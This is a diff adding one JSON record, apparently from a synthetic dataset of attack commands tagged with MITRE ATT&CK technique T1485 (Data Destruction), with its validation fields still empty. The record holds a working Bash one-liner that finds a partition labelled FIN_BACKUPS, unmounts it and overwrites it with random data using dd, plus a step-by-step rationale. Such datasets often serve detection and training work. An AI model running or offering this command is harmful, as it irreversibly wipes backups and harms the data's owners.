@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'dev=$(blkid -L FIN_BACKUPS); [ -n \"$dev\" ] && { umount \"$dev\" 2>/dev/null || true; dd if=/dev/urandom of=\"$dev\" bs=4M oflag=direct status=progress; }'",
+  "explanation": "Identifies a labeled backup partition and overwrites it with random data after unmounting.",
+  "rationale_steps": [
+    "Resolve device path by filesystem label",
+    "Ensure it is unmounted to avoid corruption during write",
+    "Overwrite the entire block device with random data",
+    "Use direct I/O for thorough, uncached writes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-3c4b6e23",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
